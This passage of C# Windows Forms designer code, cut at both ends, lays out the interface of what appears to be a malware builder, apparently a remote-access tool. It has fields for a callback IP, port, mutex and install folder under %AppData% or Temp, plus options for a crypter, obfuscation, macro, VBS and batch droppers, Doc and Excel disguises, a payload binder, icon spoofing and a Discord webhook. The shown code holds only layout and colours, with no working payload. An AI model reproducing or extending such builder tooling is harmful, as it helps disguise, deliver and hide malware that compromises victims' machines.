            bloom25.Value = System.Drawing.Color.FromArgb(((int)(((byte)(235)))), ((int)(((byte)(235)))), ((int)(((byte)(235)))));
            bloom26.Name = "NoneGradient2";
            bloom26.Value = System.Drawing.Color.FromArgb(((int)(((byte)(215)))), ((int)(((byte)(215)))), ((int)(((byte)(215)))));
            bloom27.Name = "NoneGradient3";
            bloom27.Value = System.Drawing.Color.FromArgb(((int)(((byte)(252)))), ((int)(((byte)(252)))), ((int)(((byte)(252)))));
            bloom28.Name = "NoneGradient4";
            bloom28.Value = System.Drawing.Color.FromArgb(((int)(((byte)(242)))), ((int)(((byte)(242)))), ((int)(((byte)(242)))));
            bloom29.Name = "Glow";
            bloom29.Value = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom30.Name = "TextShade";
            bloom30.Value = System.Drawing.Color.White;
            bloom31.Name = "Text";
            bloom31.Value = System.Drawing.Color.FromArgb(((int)(((byte)(80)))), ((int)(((byte)(80)))), ((int)(((byte)(80)))));
            bloom32.Name = "Border1";
            bloom32.Value = System.Drawing.Color.White;
            bloom33.Name = "Border2";
            bloom33.Value = System.Drawing.Color.FromArgb(((int)(((byte)(180)))), ((int)(((byte)(180)))), ((int)(((byte)(180)))));
            this.btnBinderBrowse.Colors = new ShitarusPrivate.Bloom[] {
        bloom23,
        bloom24,
        bloom25,
        bloom26,
        bloom27,
        bloom28,
        bloom29,
        bloom30,
        bloom31,
        bloom32,
        bloom33};
            this.btnBinderBrowse.Customization = "19fX/+vr6//r6+v/19fX//z8/P/y8vL/////Mv////9QUFD//////7S0tP8=";
            this.btnBinderBrowse.Enabled = false;
            this.btnBinderBrowse.Font = new System.Drawing.Font("Verdana", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.btnBinderBrowse.Image = null;
            this.btnBinderBrowse.Location = new System.Drawing.Point(777, 180);
            this.btnBinderBrowse.Name = "btnBinderBrowse";
            this.btnBinderBrowse.NoRounding = false;
            this.btnBinderBrowse.Size = new System.Drawing.Size(71, 30);
            this.btnBinderBrowse.TabIndex = 115;
            this.btnBinderBrowse.Text = "Add";
            this.toolTip1.SetToolTip(this.btnBinderBrowse, "Add a payload!");
            this.btnBinderBrowse.Transparent = false;
            this.btnBinderBrowse.Click += new System.EventHandler(this.btnBinderBrowse_Click);
            // 
            // btnBinderDelete
            // 
            this.btnBinderDelete.Anchor = System.Windows.Forms.AnchorStyles.Top;
            bloom34.Name = "DownGradient1";
            bloom34.Value = System.Drawing.Color.FromArgb(((int)(((byte)(215)))), ((int)(((byte)(215)))), ((int)(((byte)(215)))));
            bloom35.Name = "DownGradient2";
            bloom35.Value = System.Drawing.Color.FromArgb(((int)(((byte)(235)))), ((int)(((byte)(235)))), ((int)(((byte)(235)))));
            bloom36.Name = "NoneGradient1";
            bloom36.Value = System.Drawing.Color.FromArgb(((int)(((byte)(235)))), ((int)(((byte)(235)))), ((int)(((byte)(235)))));
            bloom37.Name = "NoneGradient2";
            bloom37.Value = System.Drawing.Color.FromArgb(((int)(((byte)(215)))), ((int)(((byte)(215)))), ((int)(((byte)(215)))));
            bloom38.Name = "NoneGradient3";
            bloom38.Value = System.Drawing.Color.FromArgb(((int)(((byte)(252)))), ((int)(((byte)(252)))), ((int)(((byte)(252)))));
            bloom39.Name = "NoneGradient4";
            bloom39.Value = System.Drawing.Color.FromArgb(((int)(((byte)(242)))), ((int)(((byte)(242)))), ((int)(((byte)(242)))));
            bloom40.Name = "Glow";
            bloom40.Value = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom41.Name = "TextShade";
            bloom41.Value = System.Drawing.Color.White;
            bloom42.Name = "Text";
            bloom42.Value = System.Drawing.Color.FromArgb(((int)(((byte)(80)))), ((int)(((byte)(80)))), ((int)(((byte)(80)))));
            bloom43.Name = "Border1";
            bloom43.Value = System.Drawing.Color.White;
            bloom44.Name = "Border2";
            bloom44.Value = System.Drawing.Color.FromArgb(((int)(((byte)(180)))), ((int)(((byte)(180)))), ((int)(((byte)(180)))));
            this.btnBinderDelete.Colors = new ShitarusPrivate.Bloom[] {
        bloom34,
        bloom35,
        bloom36,
        bloom37,
        bloom38,
        bloom39,
        bloom40,
        bloom41,
        bloom42,
        bloom43,
        bloom44};
            this.btnBinderDelete.Customization = "19fX/+vr6//r6+v/19fX//z8/P/y8vL/////Mv////9QUFD//////7S0tP8=";
            this.btnBinderDelete.Enabled = false;
            this.btnBinderDelete.Font = new System.Drawing.Font("Verdana", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.btnBinderDelete.Image = null;
            this.btnBinderDelete.Location = new System.Drawing.Point(777, 216);
            this.btnBinderDelete.Name = "btnBinderDelete";
            this.btnBinderDelete.NoRounding = false;
            this.btnBinderDelete.Size = new System.Drawing.Size(71, 30);
            this.btnBinderDelete.TabIndex = 118;
            this.btnBinderDelete.Text = "Delete";
            this.toolTip1.SetToolTip(this.btnBinderDelete, "Add a payload!");
            this.btnBinderDelete.Transparent = false;
            this.btnBinderDelete.Click += new System.EventHandler(this.btnBinderDelete_Click);
            // 
            // txtWebHook
            // 
            this.txtWebHook.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.txtWebHook.Location = new System.Drawing.Point(401, 156);
            this.txtWebHook.Multiline = true;
            this.txtWebHook.Name = "txtWebHook";
            this.txtWebHook.Size = new System.Drawing.Size(250, 30);
            this.txtWebHook.TabIndex = 103;
            this.txtWebHook.Text = "Discord Webhook (optional)";
            // 
            // primeTheme1
            // 
            this.primeTheme1.BackColor = System.Drawing.Color.White;
            this.primeTheme1.BorderStyle = System.Windows.Forms.FormBorderStyle.None;
            bloom45.Name = "Sides";
            bloom45.Value = System.Drawing.Color.FromArgb(((int)(((byte)(232)))), ((int)(((byte)(232)))), ((int)(((byte)(232)))));
            bloom46.Name = "Gradient1";
            bloom46.Value = System.Drawing.Color.FromArgb(((int)(((byte)(252)))), ((int)(((byte)(252)))), ((int)(((byte)(252)))));
            bloom47.Name = "Gradient2";
            bloom47.Value = System.Drawing.Color.FromArgb(((int)(((byte)(242)))), ((int)(((byte)(242)))), ((int)(((byte)(242)))));
            bloom48.Name = "TextShade";
            bloom48.Value = System.Drawing.Color.White;
            bloom49.Name = "Text";
            bloom49.Value = System.Drawing.Color.FromArgb(((int)(((byte)(80)))), ((int)(((byte)(80)))), ((int)(((byte)(80)))));
            bloom50.Name = "Back";
            bloom50.Value = System.Drawing.Color.White;
            bloom51.Name = "Border1";
            bloom51.Value = System.Drawing.Color.FromArgb(((int)(((byte)(180)))), ((int)(((byte)(180)))), ((int)(((byte)(180)))));
            bloom52.Name = "Border2";
            bloom52.Value = System.Drawing.Color.White;
            bloom53.Name = "Border3";
            bloom53.Value = System.Drawing.Color.White;
            bloom54.Name = "Border4";
            bloom54.Value = System.Drawing.Color.FromArgb(((int)(((byte)(150)))), ((int)(((byte)(150)))), ((int)(((byte)(150)))));
            this.primeTheme1.Colors = new ShitarusPrivate.Bloom[] {
        bloom45,
        bloom46,
        bloom47,
        bloom48,
        bloom49,
        bloom50,
        bloom51,
        bloom52,
        bloom53,
        bloom54};
            this.primeTheme1.Controls.Add(this.ambianceTabControl1);
            this.primeTheme1.Controls.Add(this.label3);
            this.primeTheme1.Controls.Add(this.pictureBox1);
            this.primeTheme1.Controls.Add(this.studioButton5);
            this.primeTheme1.Controls.Add(this.studioButton4);
            this.primeTheme1.Customization = "6Ojo//z8/P/y8vL//////1BQUP//////tLS0////////////lpaW/w==";
            this.primeTheme1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.primeTheme1.Font = new System.Drawing.Font("Verdana", 8F);
            this.primeTheme1.Image = null;
            this.primeTheme1.Location = new System.Drawing.Point(0, 0);
            this.primeTheme1.Movable = true;
            this.primeTheme1.Name = "primeTheme1";
            this.primeTheme1.NoRounding = false;
            this.primeTheme1.Sizable = true;
            this.primeTheme1.Size = new System.Drawing.Size(1090, 646);
            this.primeTheme1.SmartBounds = true;
            this.primeTheme1.TabIndex = 11;
            this.primeTheme1.TransparencyKey = System.Drawing.Color.Fuchsia;
            // 
            // ambianceTabControl1
            // 
            this.ambianceTabControl1.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.ambianceTabControl1.Controls.Add(this.tabPage1);
            this.ambianceTabControl1.Controls.Add(this.tabPage2);
            this.ambianceTabControl1.Controls.Add(this.tabPage3);
            this.ambianceTabControl1.Controls.Add(this.tabPage4);
            this.ambianceTabControl1.Controls.Add(this.tabPage5);
            this.ambianceTabControl1.Controls.Add(this.tabPage6);
            this.ambianceTabControl1.Font = new System.Drawing.Font("Verdana", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.ambianceTabControl1.ItemSize = new System.Drawing.Size(80, 24);
            this.ambianceTabControl1.Location = new System.Drawing.Point(14, 41);
            this.ambianceTabControl1.Name = "ambianceTabControl1";
            this.ambianceTabControl1.SelectedIndex = 0;
            this.ambianceTabControl1.Size = new System.Drawing.Size(1062, 592);
            this.ambianceTabControl1.TabIndex = 113;
            // 
            // tabPage1
            // 
            this.tabPage1.BackColor = System.Drawing.Color.White;
            this.tabPage1.Controls.Add(this.label30);
            this.tabPage1.Controls.Add(this.ambianceSeparator2);
            this.tabPage1.Controls.Add(this.chkASDoc);
            this.tabPage1.Controls.Add(this.toggleButtonicon);
            this.tabPage1.Controls.Add(this.label25);
            this.tabPage1.Controls.Add(this.chkCrypter);
            this.tabPage1.Controls.Add(this.chkExcel);
            this.tabPage1.Controls.Add(this.label18);
            this.tabPage1.Controls.Add(this.chkDoc);
            this.tabPage1.Controls.Add(this.chkObf);
            this.tabPage1.Controls.Add(this.pictureBoxicon);
            this.tabPage1.Controls.Add(this.label29);
            this.tabPage1.Controls.Add(this.label16);
            this.tabPage1.Controls.Add(this.primeButton3);
            this.tabPage1.Controls.Add(this.ambianceSeparator1);
            this.tabPage1.Controls.Add(this.txtIcon);
            this.tabPage1.Controls.Add(this.txtMutex);
            this.tabPage1.Controls.Add(this.chkVBS);
            this.tabPage1.Controls.Add(this.label7);
            this.tabPage1.Controls.Add(this.button3);
            this.tabPage1.Controls.Add(this.label26);
            this.tabPage1.Controls.Add(this.button2);
            this.tabPage1.Controls.Add(this.comboBox1);
            this.tabPage1.Controls.Add(this.txtFolder);
            this.tabPage1.Controls.Add(this.label21);
            this.tabPage1.Controls.Add(this.chkBatch);
            this.tabPage1.Controls.Add(this.txtFilename);
            this.tabPage1.Controls.Add(this.label10);
            this.tabPage1.Controls.Add(this.chkMacro);
            this.tabPage1.Controls.Add(this.txtIP);
            this.tabPage1.Controls.Add(this.label20);
            this.tabPage1.Controls.Add(this.primeButton1);
            this.tabPage1.Controls.Add(this.chkBin);
            this.tabPage1.Controls.Add(this.label4);
            this.tabPage1.Controls.Add(this.primeButton2);
            this.tabPage1.Controls.Add(this.txtIdentifier);
            this.tabPage1.Controls.Add(this.txtPORT);
            this.tabPage1.Controls.Add(this.label5);
            this.tabPage1.Font = new System.Drawing.Font("Verdana", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.tabPage1.Location = new System.Drawing.Point(4, 28);
            this.tabPage1.Name = "tabPage1";
            this.tabPage1.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage1.Size = new System.Drawing.Size(1054, 560);
            this.tabPage1.TabIndex = 0;
            this.tabPage1.Text = "Connection";
            // 
            // label30
            // 
            this.label30.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.label30.AutoSize = true;
            this.label30.Location = new System.Drawing.Point(271, 394);
            this.label30.Name = "label30";
            this.label30.Size = new System.Drawing.Size(82, 13);
            this.label30.TabIndex = 113;
            this.label30.Text = "Icon Settings";
            // 
            // ambianceSeparator2
            // 
            this.ambianceSeparator2.Location = new System.Drawing.Point(271, 410);
            this.ambianceSeparator2.Name = "ambianceSeparator2";
            this.ambianceSeparator2.Size = new System.Drawing.Size(515, 10);
            this.ambianceSeparator2.TabIndex = 106;
            this.ambianceSeparator2.Text = "ambianceSeparator2";
            // 
            // label25
            // 
            this.label25.AutoSize = true;
            this.label25.Location = new System.Drawing.Point(931, 489);
            this.label25.Name = "label25";
            this.label25.Size = new System.Drawing.Size(47, 13);
            this.label25.TabIndex = 101;
            this.label25.Text = "As Doc";
            this.label25.Visible = false;
            // 
            // chkExcel
            // 
            this.chkExcel.AutoSize = true;
            this.chkExcel.Location = new System.Drawing.Point(437, 226);
            this.chkExcel.Name = "chkExcel";
            this.chkExcel.Size = new System.Drawing.Size(56, 17);
            this.chkExcel.TabIndex = 102;
            this.chkExcel.Text = "Excel";
            this.chkExcel.UseVisualStyleBackColor = true;
            // 
            // chkDoc
            // 
            this.chkDoc.AutoSize = true;
            this.chkDoc.Checked = true;
            this.chkDoc.CheckState = System.Windows.Forms.CheckState.Checked;
            this.chkDoc.Location = new System.Drawing.Point(383, 226);
            this.chkDoc.Name = "chkDoc";
            this.chkDoc.Size = new System.Drawing.Size(48, 17);
            this.chkDoc.TabIndex = 101;
            this.chkDoc.Text = "Doc";
            this.chkDoc.UseVisualStyleBackColor = true;
            // 
            // pictureBoxicon
            // 
            this.pictureBoxicon.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.pictureBoxicon.Enabled = false;
            this.pictureBoxicon.Location = new System.Drawing.Point(717, 433);
            this.pictureBoxicon.Name = "pictureBoxicon";
            this.pictureBoxicon.Size = new System.Drawing.Size(69, 71);
            this.pictureBoxicon.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBoxicon.TabIndex = 53;
            this.pictureBoxicon.TabStop = false;
            // 
            // label29
            // 
            this.label29.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.label29.AutoSize = true;
            this.label29.Location = new System.Drawing.Point(271, 300);
            this.label29.Name = "label29";
            this.label29.Size = new System.Drawing.Size(62, 13);
            this.label29.TabIndex = 105;
            this.label29.Text = "Export As";
            // 
            // ambianceSeparator1
            // 
            this.ambianceSeparator1.Location = new System.Drawing.Point(271, 316);
            this.ambianceSeparator1.Name = "ambianceSeparator1";
            this.ambianceSeparator1.Size = new System.Drawing.Size(515, 10);
            this.ambianceSeparator1.TabIndex = 62;
            this.ambianceSeparator1.Text = "ambianceSeparator1";
            // 
            // txtMutex
            // 
            this.txtMutex.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.txtMutex.Location = new System.Drawing.Point(539, 97);
            this.txtMutex.Multiline = true;
            this.txtMutex.Name = "txtMutex";
            this.txtMutex.Size = new System.Drawing.Size(250, 30);
            this.txtMutex.TabIndex = 49;
            this.txtMutex.Text = "MUTEX";
            // 
            // button3
            // 
            this.button3.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.button3.BackColor = System.Drawing.Color.Transparent;
            bloom55.Name = "DownGradient1";
            bloom55.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom56.Name = "DownGradient2";
            bloom56.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom57.Name = "NoneGradient1";
            bloom57.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom58.Name = "NoneGradient2";
            bloom58.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom59.Name = "Shine1";
            bloom59.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom60.Name = "Shine2A";
            bloom60.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom61.Name = "Shine2B";
            bloom61.Value = System.Drawing.Color.Transparent;
            bloom62.Name = "Shine3";
            bloom62.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom63.Name = "TextShade";
            bloom63.Value = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            bloom64.Name = "Text";
            bloom64.Value = System.Drawing.Color.White;
            bloom65.Name = "Glow";
            bloom65.Value = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom66.Name = "Border";
            bloom66.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            bloom67.Name = "Corners";
            bloom67.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            this.button3.Colors = new ShitarusPrivate.Bloom[] {
        bloom55,
        bloom56,
        bloom57,
        bloom58,
        bloom59,
        bloom60,
        bloom61,
        bloom62,
        bloom63,
        bloom64,
        bloom65,
        bloom66,
        bloom67};
            this.button3.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.button3.Font = new System.Drawing.Font("Verdana", 8F);
            this.button3.Image = null;
            this.button3.Location = new System.Drawing.Point(798, 173);
            this.button3.Name = "button3";
            this.button3.NoRounding = false;
            this.button3.Size = new System.Drawing.Size(71, 30);
            this.button3.TabIndex = 17;
            this.button3.Text = "Random";
            this.button3.Transparent = true;
            this.button3.Click += new System.EventHandler(this.button3_Click);
            // 
            // button2
            // 
            this.button2.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.button2.BackColor = System.Drawing.Color.Transparent;
            bloom68.Name = "DownGradient1";
            bloom68.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom69.Name = "DownGradient2";
            bloom69.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom70.Name = "NoneGradient1";
            bloom70.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom71.Name = "NoneGradient2";
            bloom71.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom72.Name = "Shine1";
            bloom72.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom73.Name = "Shine2A";
            bloom73.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom74.Name = "Shine2B";
            bloom74.Value = System.Drawing.Color.Transparent;
            bloom75.Name = "Shine3";
            bloom75.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom76.Name = "TextShade";
            bloom76.Value = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            bloom77.Name = "Text";
            bloom77.Value = System.Drawing.Color.White;
            bloom78.Name = "Glow";
            bloom78.Value = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom79.Name = "Border";
            bloom79.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            bloom80.Name = "Corners";
            bloom80.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            this.button2.Colors = new ShitarusPrivate.Bloom[] {
        bloom68,
        bloom69,
        bloom70,
        bloom71,
        bloom72,
        bloom73,
        bloom74,
        bloom75,
        bloom76,
        bloom77,
        bloom78,
        bloom79,
        bloom80};
            this.button2.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.button2.Font = new System.Drawing.Font("Verdana", 8F);
            this.button2.Image = null;
            this.button2.Location = new System.Drawing.Point(798, 135);
            this.button2.Name = "button2";
            this.button2.NoRounding = false;
            this.button2.Size = new System.Drawing.Size(71, 30);
            this.button2.TabIndex = 18;
            this.button2.Text = "Random";
            this.button2.Transparent = true;
            this.button2.Click += new System.EventHandler(this.button2_Click);
            // 
            // comboBox1
            // 
            this.comboBox1.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.comboBox1.BackColor = System.Drawing.Color.WhiteSmoke;
            this.comboBox1.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(56)))), ((int)(((byte)(76)))), ((int)(((byte)(106)))));
            this.comboBox1.BorderSize = 1;
            this.comboBox1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F);
            this.comboBox1.ForeColor = System.Drawing.Color.DimGray;
            this.comboBox1.IconColor = System.Drawing.Color.FromArgb(((int)(((byte)(56)))), ((int)(((byte)(76)))), ((int)(((byte)(106)))));
            this.comboBox1.Items.AddRange(new object[] {
            "%AppData%\\Local",
            "%AppData%\\Roaming",
            "%AppData%\\Local\\Temp"});
            this.comboBox1.ListBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(230)))), ((int)(((byte)(228)))), ((int)(((byte)(245)))));
            this.comboBox1.ListTextColor = System.Drawing.Color.DimGray;
            this.comboBox1.Location = new System.Drawing.Point(540, 211);
            this.comboBox1.MinimumSize = new System.Drawing.Size(200, 30);
            this.comboBox1.Name = "comboBox1";
            this.comboBox1.Padding = new System.Windows.Forms.Padding(1);
            this.comboBox1.Size = new System.Drawing.Size(250, 30);
            this.comboBox1.TabIndex = 30;
            this.comboBox1.Texts = "";
            this.comboBox1.Visible = false;
            // 
            // txtFolder
            // 
            this.txtFolder.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.txtFolder.Location = new System.Drawing.Point(539, 173);
            this.txtFolder.Multiline = true;
            this.txtFolder.Name = "txtFolder";
            this.txtFolder.Size = new System.Drawing.Size(250, 30);
            this.txtFolder.TabIndex = 50;
            this.txtFolder.Text = "FOLDERNAME";
            // 
            // txtFilename
            // 
            this.txtFilename.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.txtFilename.Location = new System.Drawing.Point(539, 135);
            this.txtFilename.Multiline = true;
            this.txtFilename.Name = "txtFilename";
            this.txtFilename.Size = new System.Drawing.Size(250, 30);
            this.txtFilename.TabIndex = 51;
            this.txtFilename.Text = "FILENAME";
            // 
            // txtIP
            // 
            this.txtIP.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.txtIP.Location = new System.Drawing.Point(271, 97);
            this.txtIP.Multiline = true;
            this.txtIP.Name = "txtIP";
            this.txtIP.Size = new System.Drawing.Size(250, 30);
            this.txtIP.TabIndex = 46;
            this.txtIP.Text = "IP";
            // 
            // primeButton1
            // 
            this.primeButton1.Anchor = System.Windows.Forms.AnchorStyles.Top;
            bloom81.Name = "DownGradient1";
            bloom81.Value = System.Drawing.Color.FromArgb(((int)(((byte)(215)))), ((int)(((byte)(215)))), ((int)(((byte)(215)))));
            bloom82.Name = "DownGradient2";
            bloom82.Value = System.Drawing.Color.FromArgb(((int)(((byte)(235)))), ((int)(((byte)(235)))), ((int)(((byte)(235)))));
            bloom83.Name = "NoneGradient1";
            bloom83.Value = System.Drawing.Color.FromArgb(((int)(((byte)(235)))), ((int)(((byte)(235)))), ((int)(((byte)(235)))));
            bloom84.Name = "NoneGradient2";
            bloom84.Value = System.Drawing.Color.FromArgb(((int)(((byte)(215)))), ((int)(((byte)(215)))), ((int)(((byte)(215)))));
            bloom85.Name = "NoneGradient3";
            bloom85.Value = System.Drawing.Color.FromArgb(((int)(((byte)(252)))), ((int)(((byte)(252)))), ((int)(((byte)(252)))));
            bloom86.Name = "NoneGradient4";
            bloom86.Value = System.Drawing.Color.FromArgb(((int)(((byte)(242)))), ((int)(((byte)(242)))), ((int)(((byte)(242)))));
            bloom87.Name = "Glow";
            bloom87.Value = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom88.Name = "TextShade";
            bloom88.Value = System.Drawing.Color.White;
            bloom89.Name = "Text";
            bloom89.Value = System.Drawing.Color.FromArgb(((int)(((byte)(80)))), ((int)(((byte)(80)))), ((int)(((byte)(80)))));
            bloom90.Name = "Border1";
            bloom90.Value = System.Drawing.Color.White;
            bloom91.Name = "Border2";
            bloom91.Value = System.Drawing.Color.FromArgb(((int)(((byte)(180)))), ((int)(((byte)(180)))), ((int)(((byte)(180)))));
            this.primeButton1.Colors = new ShitarusPrivate.Bloom[] {
        bloom81,
        bloom82,
        bloom83,
        bloom84,
        bloom85,
        bloom86,
        bloom87,
        bloom88,
        bloom89,
        bloom90,
        bloom91};
            this.primeButton1.Customization = "19fX/+vr6//r6+v/19fX//z8/P/y8vL/////Mv////9QUFD//////7S0tP8=";
            this.primeButton1.Font = new System.Drawing.Font("Verdana", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.primeButton1.Image = null;
            this.primeButton1.Location = new System.Drawing.Point(189, 136);
            this.primeButton1.Name = "primeButton1";
            this.primeButton1.NoRounding = false;
            this.primeButton1.Size = new System.Drawing.Size(71, 30);
            this.primeButton1.TabIndex = 44;
            this.primeButton1.Text = "Set Port";
            this.primeButton1.Transparent = false;
            this.primeButton1.Click += new System.EventHandler(this.primeButton1_Click);
            // 
            // primeButton2
            // 
            this.primeButton2.Anchor = System.Windows.Forms.AnchorStyles.Top;
            bloom92.Name = "DownGradient1";
            bloom92.Value = System.Drawing.Color.FromArgb(((int)(((byte)(215)))), ((int)(((byte)(215)))), ((int)(((byte)(215)))));
            bloom93.Name = "DownGradient2";
            bloom93.Value = System.Drawing.Color.FromArgb(((int)(((byte)(235)))), ((int)(((byte)(235)))), ((int)(((byte)(235)))));
            bloom94.Name = "NoneGradient1";
            bloom94.Value = System.Drawing.Color.FromArgb(((int)(((byte)(235)))), ((int)(((byte)(235)))), ((int)(((byte)(235)))));
            bloom95.Name = "NoneGradient2";
            bloom95.Value = System.Drawing.Color.FromArgb(((int)(((byte)(215)))), ((int)(((byte)(215)))), ((int)(((byte)(215)))));
            bloom96.Name = "NoneGradient3";
            bloom96.Value = System.Drawing.Color.FromArgb(((int)(((byte)(252)))), ((int)(((byte)(252)))), ((int)(((byte)(252)))));
            bloom97.Name = "NoneGradient4";
            bloom97.Value = System.Drawing.Color.FromArgb(((int)(((byte)(242)))), ((int)(((byte)(242)))), ((int)(((byte)(242)))));
            bloom98.Name = "Glow";
            bloom98.Value = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom99.Name = "TextShade";
            bloom99.Value = System.Drawing.Color.White;
            bloom100.Name = "Text";
            bloom100.Value = System.Drawing.Color.FromArgb(((int)(((byte)(80)))), ((int)(((byte)(80)))), ((int)(((byte)(80)))));
            bloom101.Name = "Border1";
            bloom101.Value = System.Drawing.Color.White;
            bloom102.Name = "Border2";
            bloom102.Value = System.Drawing.Color.FromArgb(((int)(((byte)(180)))), ((int)(((byte)(180)))), ((int)(((byte)(180)))));
            this.primeButton2.Colors = new ShitarusPrivate.Bloom[] {
        bloom92,
        bloom93,
        bloom94,
        bloom95,
        bloom96,
        bloom97,
        bloom98,
        bloom99,
        bloom100,
        bloom101,
        bloom102};
            this.primeButton2.Customization = "19fX/+vr6//r6+v/19fX//z8/P/y8vL/////Mv////9QUFD//////7S0tP8=";
            this.primeButton2.Font = new System.Drawing.Font("Verdana", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.primeButton2.Image = null;
            this.primeButton2.Location = new System.Drawing.Point(189, 173);
            this.primeButton2.Name = "primeButton2";
            this.primeButton2.NoRounding = false;
            this.primeButton2.Size = new System.Drawing.Size(71, 30);
            this.primeButton2.TabIndex = 45;
            this.primeButton2.Text = "Set Group";
            this.primeButton2.Transparent = false;
            this.primeButton2.Click += new System.EventHandler(this.primeButton2_Click);
            // 
            // txtIdentifier
            // 
            this.txtIdentifier.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.txtIdentifier.Location = new System.Drawing.Point(271, 173);
            this.txtIdentifier.Multiline = true;
            this.txtIdentifier.Name = "txtIdentifier";
            this.txtIdentifier.Size = new System.Drawing.Size(250, 30);
            this.txtIdentifier.TabIndex = 47;
            this.txtIdentifier.Text = "GROUP";
            // 
            // txtPORT
            // 
            this.txtPORT.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.txtPORT.Location = new System.Drawing.Point(271, 135);
            this.txtPORT.Multiline = true;
            this.txtPORT.Name = "txtPORT";
            this.txtPORT.Size = new System.Drawing.Size(250, 30);
